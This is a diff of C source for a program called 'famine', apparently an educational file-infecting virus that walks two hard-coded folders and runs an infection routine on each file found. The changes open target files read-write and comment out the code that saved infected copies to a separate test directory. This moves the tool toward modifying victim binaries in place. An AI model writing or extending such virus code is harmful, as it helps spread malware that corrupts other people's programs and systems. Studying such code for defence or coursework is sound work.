@@ -28,7 +28,7 @@ int get_binary_data(char *file_name, t_famine *famine)
         return error(ERROR_NOT_A_REGULAR_FILE, famine);
     }
 
-    if ((fd = open(file_name, O_RDONLY)) == -1)
+    if ((fd = open(file_name, O_RDWR)) == -1)
     {
         return error(ERROR_OPEN, famine);
     }
@@ -56,17 +56,21 @@ int get_binary_data(char *file_name, t_famine *famine)
 
 int write_famine_file(t_famine *famine, const char *file_name)
 {
-    int fd;
+    (void)famine;
+    (void)file_name;
+    return 0;
 
-    if ((fd = open(file_name, O_WRONLY | O_CREAT, S_IRWXU)) < 0)
-    {
-        return error(ERROR_OPEN, famine);
-    }
-    if ((write(fd, famine->infected_file, famine->infected_file_size)) < 0)
-    {
-        return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_WRITE, famine));
-    }
-    return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0);
+    // int fd;
+
+    // if ((fd = open(file_name, O_WRONLY | O_CREAT, S_IRWXU)) < 0)
+    // {
+    //     return error(ERROR_OPEN, famine);
+    // }
+    // if ((write(fd, famine->infected_file, famine->infected_file_size)) < 0)
+    // {
+    //     return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : error(ERROR_WRITE, famine));
+    // }
+    // return (close(fd) == -1 ? error(ERROR_CLOSE, famine) : 0);
 }
 
 int infect_file_in_folder(const char *path)
@@ -74,10 +78,10 @@ int infect_file_in_folder(const char *path)
     struct dirent *dp;
     DIR *dir = opendir(path);
     t_famine *famine;
-
-    // TODO REMOVE LINE BELLOW
-    char *output_file_name;
     char *input_file_name;
+
+    // // TODO REMOVE LINE BELLOW
+    // char *output_file_name;
 
     // Unable to open directory stream
     if (!dir)
@@ -119,12 +123,12 @@ int infect_file_in_folder(const char *path)
         apply_infection(famine);
 
         // TODO REMOVE LINE BELLOW
-        output_file_name = concat_strings("./infected_file/", dp->d_name);
-        if (DEBUG == true)
-            printf("output filename = %s\n", output_file_name);
-        write_famine_file(famine, output_file_name);
+        // output_file_name = concat_strings("./infected_file/", dp->d_name);
+        // if (DEBUG == true)
+        // printf("output filename = %s\n", output_file_name);
+        // write_famine_file(famine, output_file_name);
+        // free(output_file_name);
         free_famine(famine);
-        free(output_file_name);
     }
 
     if (closedir(dir) == -1)
@@ -140,7 +144,7 @@ int main(void)
     int ret;
 
     // TODO REMOVE LINE BELLOW
-    mkdir("./infected_file/", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+    // mkdir("./infected_file/", S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
 
     if (((ret = infect_file_in_folder(FOLDER_TO_INFECT_ONE)) && ret != ERROR_OPENDIR) ||
         ((ret = infect_file_in_folder(FOLDER_TO_INFECT_TWO)) && ret != ERROR_OPENDIR))
